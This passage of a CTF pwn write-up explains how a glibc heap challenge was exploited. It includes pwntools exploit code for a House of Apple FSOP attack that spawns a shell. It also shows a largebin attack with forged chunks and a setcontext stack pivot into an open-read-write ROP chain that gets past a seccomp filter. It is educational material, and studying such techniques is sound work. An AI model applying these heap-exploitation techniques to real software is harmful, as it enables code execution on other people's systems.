+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span>
+<span class="hljs-type">size_t</span>
+_IO_fwrite (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE *fp)
+{
+  <span class="hljs-type">size_t</span> request = size * count;
+  <span class="hljs-type">size_t</span> written = <span class="hljs-number">0</span>;
+  CHECK_FILE (fp, <span class="hljs-number">0</span>);
+  <span class="hljs-keyword">if</span> (request == <span class="hljs-number">0</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+  _IO_acquire_lock (fp);
+  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span> || _IO_fwide (fp, <span class="hljs-number">-1</span>) == <span class="hljs-number">-1</span>)
+    written = _IO_sputn (fp, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) buf, request);
+  _IO_release_lock (fp);
+  <span class="hljs-comment">/* We have written all of the input in case the return value indicates
+     this or EOF is returned.  The latter is a special case where we
+     simply did not manage to flush the buffer.  But the data is in the
+     buffer and therefore written as far as fwrite is concerned.  */</span>
+  <span class="hljs-keyword">if</span> (written == request || written == EOF)
+    <span class="hljs-keyword">return</span> count;
+  <span class="hljs-keyword">else</span>
+    <span class="hljs-keyword">return</span> written / size;
+}
+</code></pre>
+<p>We can perform a House of Apple by adjusting the offset from <code>_IO_wfile_jumps</code> such that <code>_IO_wfile_overflow</code> is called:</p>
+<pre class="hljs"><code>stderr_addr = heap_base + <span class="hljs-number">0x610</span>
+wide_data = heap_base + <span class="hljs-number">0xcf0</span>
+
+fs = FileStructure()
+fs.flags = u64(<span class="hljs-string">&quot;  &quot;</span> + <span class="hljs-string">&quot;sh&quot;</span>.ljust(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;\x00&quot;</span>))
+fs._IO_write_base = <span class="hljs-number">0</span>
+fs._IO_write_ptr = <span class="hljs-number">1</span>
+fs._lock = stderr_addr+<span class="hljs-number">0x1000</span> <span class="hljs-comment"># Should be null</span>
+fs.chain = libc.sym.system
+fs._codecvt = stderr_addr
+<span class="hljs-comment"># stderr becomes it&#x27;s own wide data vtable</span>
+<span class="hljs-comment"># Offset is so that system (fs.chain) is called</span>
+fs._wide_data = wide_data
+fs.vtable = libc.sym._IO_wfile_jumps - <span class="hljs-number">0x38</span> + <span class="hljs-number">0x18</span>
+
+create_sp(<span class="hljs-built_in">bytes</span>(fs))
+create_sp(flat({
+    <span class="hljs-number">0x48</span>+<span class="hljs-number">0x68</span>:libc.sym.system,
+    <span class="hljs-number">0xe0</span>:wide_data+<span class="hljs-number">0x48</span>
+}, filler=<span class="hljs-string">b&#x27;\0&#x27;</span>))
+
+leave(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;bleh&#x27;</span>)
+
+p.interactive()
+</code></pre>
+<p>This gives us a shell!
+<img src="/images/2025-12-09-20-25-58.png"alt="shell"loading="lazy"decoding="async"width="1191"height="872"></p>
+<h2 id="intended-solution-(%2Bseccomp)"tabindex="-1">Intended Solution (+seccomp)</h2>
+<p>After the CTF, the author told me that the intended solution was not to hijack the file struct pointer chunk through a fastbin arbitrary allocation (he had made the mistake of making the file struct pointer chunk within the fastbin size range), but rather an arbitrary write with a largebin attack.</p>
+<p>Furthermore, the original challenge involved bypassing a seccomp filter that prevented a trivial shell through execve/execveat:</p>
+<pre class="hljs"><code><span class="hljs-type">int</span> <span class="hljs-title function_">install_filter_via_prctl</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">filter</span>[] =</span> {
+        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="hljs-keyword">struct</span> seccomp_data, nr)),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execveat, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+    };
+    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog</span> <span class="hljs-title">prog</span> =</span> {
+        .len = <span class="hljs-keyword">sizeof</span>(filter) / <span class="hljs-keyword">sizeof</span>(filter[<span class="hljs-number">0</span>]),
+        .filter = filter,
+    };
+
+    <span class="hljs-keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))
+    {
+        perror(<span class="hljs-string">&quot;prctl(NO_NEW_PRIVS)&quot;</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+
+    <span class="hljs-keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) == <span class="hljs-number">-1</span>)
+    {
+        perror(<span class="hljs-string">&quot;prctl(SECCOMP)&quot;</span>);
+        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>In order to do this, we create two fake unsorted chunks. We prepare a heap layout with such:</p>
+<pre class="hljs"><code><span class="hljs-comment"># overflower + victim</span>
+
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>) <span class="hljs-comment"># 0 </span>
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>) <span class="hljs-comment"># 1</span>
+
+<span class="hljs-comment"># buffer chunks</span>
+
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+
+<span class="hljs-comment"># overflower + victim</span>
+
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>) <span class="hljs-comment"># 2</span>
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>) <span class="hljs-comment"># 3</span>
+
+<span class="hljs-comment"># Buffer chunks</span>
+
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+create(<span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;meh:&#x27;</span>)
+
+<span class="hljs-comment"># Arballoc</span>
+
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>) <span class="hljs-comment"># 4</span>
+</code></pre>
+<p>Now, we arballoc twice to forge size headers:</p>
+<pre class="hljs"><code>edit(<span class="hljs-number">0</span>, p64(mangle ^ (heap_base+<span class="hljs-number">0x4c0</span>)))
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>.ljust(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mangle))
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4e1</span>))
+free(<span class="hljs-number">1</span>) <span class="hljs-comment"># first fake unsorted chunk</span>
+
+libc.address = u64(view(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>)) - <span class="hljs-number">0x203b20</span>
+log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)
+
+edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mangle))
+free(<span class="hljs-number">4</span>)
+edit(<span class="hljs-number">4</span>, p64(mangle ^ (heap_base + <span class="hljs-number">0xa10</span>)))
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>)
+create(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;FAST:&#x27;</span>.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;A&#x27;</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4d1</span>)) <span class="hljs-comment"># second fake unsorted chunk, must be smaller than the first</span>
+</code></pre>
+<p>This puts us in position to perform a largebin attack to overwrite the file struct pointer with a pointer to our second fake chunk.</p>
+<p>We use the special chunk allocations to insert the fake chunks into the largebin. Since the special note allocations of 0x500 are larger than the unsorted bin chunks of 0x4e0 and 0x4d0, glibc:
+- Sorts the unsorted chunks into the large/smallbin
+- Allocates a fresh chunk for the special notes chunk from the top chunk</p>
+<p>First we insert the first fake chunk into the largebin:</p>
+<pre class="hljs"><code>create_sp(<span class="hljs-string">b&#x27;a&#x27;</span>)
+</code></pre>
+<p>Then, using the UAF on our fake chunk, we can edit <code>bk_nextsize</code> to the <code>target-0x20</code>:</p>
+<pre class="hljs"><code>edit(<span class="hljs-number">1</span>, p64(libc.sym.main_arena+<span class="hljs-number">1152</span>)*<span class="hljs-number">2</span>+p64(heap_base+<span class="hljs-number">0x500</span>)+p64(heap_base+<span class="hljs-number">0x480</span>-<span class="hljs-number">0x20</span>))
+</code></pre>
+<p>Finally, we free our second fake chunk into the unsorted bin and use our second special chunk allocation to insert it into the same largebin as the first largebin chunk:</p>
+<pre class="hljs"><code>free(<span class="hljs-number">3</span>)
+create_sp(<span class="hljs-string">b&#x27;a&#x27;</span>)
+</code></pre>
+<p>This writes the address of the second fake chunk to our file struct pointer chunk.</p>
+<h3 id="rce%3A-stack-pivoting-to-rop"tabindex="-1">RCE: Stack Pivoting to ROP</h3>
+<p>Now, we can use the <code>leave()</code> feature to edit the second fake chunk to FSOP and RCE. However, because seccomp prevents us from using <code>execve</code> and <code>execveat</code> syscalls, a trivial shell with <code>system()</code> will not work. We will have to find a way to pivot our stack onto the heap where our ROP chain can be written and executed.</p>
+<p>We use House of Apple yet again, but instead employ two gadgets:</p>
+<pre class="hljs"><code>0x00000000001303d5 : mov rdx, rax ; call qword ptr [rbx + 0x28]
+</code></pre>
+<p>to set the value of <code>rdx</code> and call our second gadget:</p>
+<p>an <code>rsp</code> modifiying gadget at <code>setcontext+61</code>:</p>
+<pre class="hljs"><code>   0x00007ffff7c4a99d &lt;+61&gt;:	mov    rsp,QWORD PTR [rdx+0xa0]
+   0x00007ffff7c4a9a4 &lt;+68&gt;:	mov    rbx,QWORD PTR [rdx+0x80]
+   0x00007ffff7c4a9ab &lt;+75&gt;:	mov    rbp,QWORD PTR [rdx+0x78]
+   0x00007ffff7c4a9af &lt;+79&gt;:	mov    r12,QWORD PTR [rdx+0x48]
+   0x00007ffff7c4a9b3 &lt;+83&gt;:	mov    r13,QWORD PTR [rdx+0x50]
+   0x00007ffff7c4a9b7 &lt;+87&gt;:	mov    r14,QWORD PTR [rdx+0x58]
+   0x00007ffff7c4a9bb &lt;+91&gt;:	mov    r15,QWORD PTR [rdx+0x60]
+   0x00007ffff7c4a9bf &lt;+95&gt;:	test   DWORD PTR fs:0x48,0x2
+   0x00007ffff7c4a9cb &lt;+107&gt;:	je     0x7ffff7c4aa86 &lt;setcontext+294&gt;
+   ...
+   0x00007ffff7c4aa86 &lt;+294&gt;:	mov    rcx,QWORD PTR [rdx+0xa8]
+   0x00007ffff7c4aa8d &lt;+301&gt;:	push   rcx
+   0x00007ffff7c4aa8e &lt;+302&gt;:	mov    rsi,QWORD PTR [rdx+0x70]
+   0x00007ffff7c4aa92 &lt;+306&gt;:	mov    rdi,QWORD PTR [rdx+0x68]
+   0x00007ffff7c4aa96 &lt;+310&gt;:	mov    rcx,QWORD PTR [rdx+0x98]
+   0x00007ffff7c4aa9d &lt;+317&gt;:	mov    r8,QWORD PTR [rdx+0x28]
+   0x00007ffff7c4aaa1 &lt;+321&gt;:	mov    r9,QWORD PTR [rdx+0x30]
+   0x00007ffff7c4aaa5 &lt;+325&gt;:	mov    rdx,QWORD PTR [rdx+0x88]
+   0x00007ffff7c4aaac &lt;+332&gt;:	xor    eax,eax
+   0x00007ffff7c4aaae &lt;+334&gt;:	ret 
+</code></pre>
+<p>As the details of how to ROP from an FSOP attack is outside of the scope of this write-up <a href="https://blog.kylebot.net/2022/10/22/angry-FSROP/">and can be found here</a>, we modify our file struct to pivot onto our ROP chain on the same allocation:</p>
+<pre class="hljs"><code>rop = ROP(libc)
+rop.raw(libc.address+<span class="hljs-number">0x00000000000b503c</span>) <span class="hljs-comment"># pop rdx + pop 4 regs</span>
+rop.raw(constants.O_RDONLY)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.call(libc.sym.syscall, [constants.SYS_open, chain+<span class="hljs-number">0x48</span>])
+rop.raw(libc.address+<span class="hljs-number">0x00000000000b503c</span>)
+rop.raw(<span class="hljs-number">0x100</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.rdi = <span class="hljs-number">4</span>
+rop.rsi = heap_base+<span class="hljs-number">0x280</span>
+rop.raw(libc.sym.read)
+rop.raw(libc.address+<span class="hljs-number">0x00000000000b503c</span>)
+rop.raw(<span class="hljs-number">0x100</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.raw(<span class="hljs-number">0</span>)
+rop.rdi = <span class="hljs-number">1</span>
+rop.rsi = heap_base+<span class="hljs-number">0x280</span>
+rop.raw(libc.sym.write)
+
+fs = FileStructure()
+fs.flags = u64(<span class="hljs-string">&quot;  &quot;</span> + <span class="hljs-string">&quot;sh&quot;</span>.ljust(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;\x00&quot;</span>))
+fs._IO_write_base = <span class="hljs-number">0</span>
+fs._IO_write_ptr = libc.sym.setcontext+<span class="hljs-number">61</span>
+fs._lock = stderr_addr+<span class="hljs-number">0x1000</span> <span class="hljs-comment"># Should be null</span>
+fs._codecvt = stderr_addr
+<span class="hljs-comment"># stderr becomes it&#x27;s own wide data vtable</span>
+<span class="hljs-comment"># Offset is so that system (fs.chain) is called</span>
+fs._wide_data = wide_data
+fs.vtable = libc.sym._IO_wfile_jumps - <span class="hljs-number">0x38</span> + <span class="hljs-number">0x18</span>
+
+wide_data_str = flat({
+    <span class="hljs-number">0x68</span>: libc.address + <span class="hljs-number">0x00000000001303d5</span>,
+    <span class="hljs-number">0xe0</span>: wide_data,
+    <span class="hljs-number">0xa0</span>: [chain+<span class="hljs-number">0x18</span>+<span class="hljs-number">0x50</span>-<span class="hljs-number">8</span>,rop.build()[<span class="hljs-number">0</span>]]
+}, filler=<span class="hljs-string">b&#x27;\0&#x27;</span>)
+</code></pre>
+<p>and write everything to our fake file struct chunk with <code>leave()</code> to trigger the ROP chain:</p>
+<pre class="hljs"><code>leave(<span class="hljs-number">3</span>, <span class="hljs-built_in">bytes</span>(fs)+wide_data_str+<span class="hljs-string">b&#x27;flag.txt&#x27;</span>+p64(<span class="hljs-number">0</span>)+rop.chain())
+</code></pre>
+<p>The ROP chain does a standard open-read-write chain on flag.txt to eventually write it out to the console:</p>
+<p><img src="/images/2025-12-10-13-12-42.png"alt="intended"loading="lazy"decoding="async"width="1286"height="821"></p>
+
+      </section>
+      <section id="article-navigation">
+        
+          <div class="article-navigation-item article-navigation-next">
+            <a href="/article/3.html">
+              <div class="article-navigation-arrow article-navigation-next">＜</div>
+              <div class="article-navigation-content article-navigation-next">
+                <p class="article-navigation-title">BlahajCTF 2025 Finals</p>
+                <p class="article-navigation-subtitle">Writeup for the pwn challenge ret2...what? by @FS in the BlahajCTF 2025 Finals</p>
+              </div>
+            </a>
+          </div>
+        
+        
+      </section>
+      <section id="article-list-button-container">
+        <a href="/articles.html">
+          <div id="article-list-button">📚</div>
+        </a>
+      </section>
+    </article>
+  </main>
+
+
